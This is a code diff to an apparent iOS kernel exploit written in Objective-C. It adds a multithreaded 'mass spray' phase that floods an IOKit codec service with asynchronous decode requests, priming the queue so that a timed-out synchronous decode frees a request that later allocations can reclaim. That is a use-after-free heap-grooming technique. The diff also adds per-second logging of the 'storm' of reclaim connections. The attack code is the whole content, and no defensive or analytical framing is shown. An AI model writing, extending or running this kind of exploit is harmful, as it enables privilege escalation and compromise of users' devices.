@@ -7,6 +7,7 @@
 #import <stdint.h>
 #import <stdio.h>
 #import <string.h>
+#import <time.h>
 
 typedef mach_port_t io_object_t;
 typedef io_object_t io_service_t;
@@ -54,6 +55,7 @@ static UIViewController *gVC = nil;
 static volatile int gStop = 0;
 static NSLock *gLogLock = nil;
 static UIBackgroundTaskIdentifier gBG = 0;
+static volatile time_t gLastStormLog = 0;
 
 static NSString *docsPath(void) {
     return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
@@ -238,6 +240,37 @@ static void reclaimAll(void) {
     }
     usleep(300000);
 
+    /* Phase 1b: mass prime. The small 5-request prime alone does not stall
+       our own sync decode; the Camera-triggered decode does. Churn the codec
+       queue first so the next sync decode can hit the timeout path. */
+    const int STHREADS = 8;
+    const int SITERS = 50;
+    const int SREQS = 10;
+    __block int32_t sConn = 0, sReq = 0, sFail = 0;
+    appendLog(@"mass spray start %dx%dx%d", STHREADS, SITERS, SREQS);
+    dispatch_group_t sgroup = dispatch_group_create();
+    for (int t = 0; t < STHREADS; t++) {
+        dispatch_group_async(sgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < SITERS && !gStop; i++) {
+                io_connect_t mc = 0;
+                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &mc);
+                if (opr != KERN_SUCCESS || !mc) {
+                    __sync_fetch_and_add(&sFail, 1);
+                    continue;
+                }
+                int n = submitAsync(mc, srcID, dstID, W, H, SREQS,
+                                    0x31310000 + (t << 8) + i, 0);
+                if (n < SREQS) __sync_fetch_and_add(&sFail, 1);
+                IOServiceClose(mc);
+                __sync_fetch_and_add(&sReq, n);
+                __sync_fetch_and_add(&sConn, 1);
+            }
+        });
+    }
+    dispatch_group_wait(sgroup, dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));
+    appendLog(@"mass spray done conn=%d req=%d fail=%d", sConn, sReq, sFail);
+    usleep(1000000);
+
     /* Phase 2: same-thread free/reuse cycles.
        startDecoder_sync() blocks for up to 10s, times out, frees the request,
        and returns. The very next startDecoder allocation on the same
@@ -289,6 +322,11 @@ static void reclaimAll(void) {
                                     0x41410000 + (t << 12) + (rConn & 0xfff), 1);
                 __sync_fetch_and_add(&rReq, n);
                 __sync_fetch_and_add(&rConn, 1);
+                time_t now = time(NULL);
+                if (now != gLastStormLog) {
+                    gLastStormLog = now;
+                    appendLog(@"storm conn=%d req=%d", rConn, rReq);
+                }
                 usleep(20000); /* keep requests in flight */
                 IOServiceClose(c);
             }
